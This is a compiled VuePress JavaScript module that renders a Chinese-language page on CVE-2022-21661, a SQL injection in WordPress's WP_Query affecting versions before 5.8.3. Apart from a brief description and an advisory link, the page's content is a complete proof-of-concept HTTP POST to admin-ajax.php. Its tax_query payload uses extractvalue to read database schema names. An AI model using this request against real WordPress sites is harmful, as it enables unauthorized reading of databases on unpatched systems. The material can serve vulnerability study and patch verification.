import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o,c as r,a as e,b as d,d as s,e as a}from"./app-58e4a7d6.js";const c={},l=a('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p><code>WordPress</code>是一个用<code>PHP</code>编写的免费开源内容管理系统，由于<code>clean_query</code>函数的校验不当，导致了可能通过插件或主题以某种方式从而触发<code>SQL</code>注入的情况。这已经在<code>WordPress5.8.3</code>中进行了修复。影响版本可以追溯到<code>3.7.37</code>。</p><p>参考链接：</p>',3),u={href:"https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84",target:"_blank",rel:"noopener noreferrer"},m=a(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>WordPress &lt; 5.8.3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><p>获取数据库名：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 130

action=test&amp;data={&quot;tax_query&quot;:[{&quot;field&quot;:&quot;term_taxonomy_id&quot;,&quot;terms&quot;:[&quot;1) and extractvalue(rand(),concat(0x5e,(select group_concat(schema_name) from information_schema.SCHEMATA)))#&quot;]}]}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206231609284.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,6);function p(h,v){const n=i("ExternalLinkIcon");return o(),r("div",null,[l,e("ul",null,[e("li",null,[e("a",u,[d("https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84"),s(n)])])]),m])}const g=t(c,[["render",p],["__file","WordPress WP_Query SQL 注入漏洞 CVE-2022-21661.html.vue"]]);export{g as default};
